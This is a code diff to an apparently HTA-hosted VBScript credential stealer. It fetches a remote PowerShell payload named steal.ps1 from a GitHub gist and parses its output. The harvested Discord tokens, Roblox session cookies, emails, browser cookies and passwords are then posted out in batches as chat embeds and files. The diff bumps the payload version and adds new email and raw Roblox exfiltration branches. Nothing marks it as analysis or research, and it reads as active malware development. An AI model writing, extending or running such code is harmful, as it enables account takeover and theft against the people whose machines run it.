@@ -17,14 +17,15 @@ Dim BUF: BUF = ""
 Dim BUFC: BUFC = 0
 
 Call GrabTokens
-Flush
+Call Flush
 Call IP
+Call Flush
 
 window.close()
 
 ' ============================================================
 Sub GrabTokens()
-    Dim url: url = "https://gist.githubusercontent.com/Lxg-cmd/db66e446becfc797f0f82ced9cea78fb/raw/3b6546cc1f489afa79f41740a62b4edc5a3b9aad/steal.ps1"
+    Dim url: url = "https://gist.githubusercontent.com/Lxg-cmd/02ee306708c6da2a54e3feb8e713f00d/raw/738e9b19606bfae2a2f67948d5a7f60366138772/steal.ps1"
     Dim xh: Set xh = CreateObject("MSXML2.ServerXMLHTTP.6.0")
     xh.SetOption 2, 13056
     xh.Open "GET", url, False
@@ -58,8 +59,8 @@ Sub GrabTokens()
 
     Dim lines: lines = Split(raw, vbCrLf)
     Dim first: first = Split(lines(0), Chr(31))
-    If first(0) <> "VER" Or first(1) <> "4" Then
-        Call AddEmbed(":warning: VERSION MISMATCH", "got [" & first(0) & " " & first(1) & "], expected VER 4" & vbCrLf & "gist is serving an old script", 16711680)
+    If first(0) <> "VER" Or first(1) <> "5" Then
+        Call AddEmbed(":warning: VERSION MISMATCH", "got [" & first(0) & " " & first(1) & "], expected VER 5" & vbCrLf & "gist is serving an old script", 16711680)
     End If
 
     ParseLines lines
@@ -102,6 +103,10 @@ Sub ParseLines(lines)
                 cookieDump = cookieDump & f(1) & vbTab & f(2) & vbTab & f(3) & vbTab & f(4) & vbCrLf
             End If
 
+            If tag = "EMAIL" And UBound(f) >= 2 Then
+                Call AddEmbed(":e-mail: Email — " & f(1), f(2), 10181046)
+            End If
+
             If tag = "DISCORD" And UBound(f) >= 5 Then
                 Dim di: di = "**User:** " & f(1) & vbCrLf
                 If f(2) <> "" Then di = di & "**Email:** " & f(2) & vbCrLf
@@ -111,9 +116,13 @@ Sub ParseLines(lines)
                 Call AddEmbed(":gift: Discord Token", Left(di, 3900), 5793266)
             End If
 
-            If (tag = "ROBLOX" Or tag = "ROBLOXMS") And UBound(f) >= 1 Then
-                Call AddEmbed(":cookie: " & tag, "Size: " & Len(f(1)) & " | PC: " & PC, 65280)
-                Call PostFile(tag & "_cookie.txt", f(1))
+            If tag = "ROBLOX" And UBound(f) >= 1 Then
+                Call AddEmbed(":cookie: Roblox", "Size: " & Len(f(1)) & " | PC: " & PC, 65280)
+                Call PostFile("roblox_cookie.txt", f(1))
+            End If
+
+            If tag = "ROBLOXRAW" And UBound(f) >= 2 Then
+                Call AddEmbed(":page_facing_up: Roblox raw — " & f(1), Left(f(2), 1800), 9807270)
             End If
 
             If tag = "PASSWORD" And UBound(f) >= 4 Then
@@ -161,7 +170,7 @@ Sub AddEmbed(t, d, c)
                    DQ & "description" & DQ & ":" & DQ & Ej(d) & DQ & "," & _
                    DQ & "color" & DQ & ":" & c & "}"
     If Len(BUF) > 0 Then BUF = BUF & ","
-    BUF = BUF & e
+    BUF  = BUF & e
     BUFC = BUFC + 1
     If BUFC >= 10 Then Call Flush
 End Sub
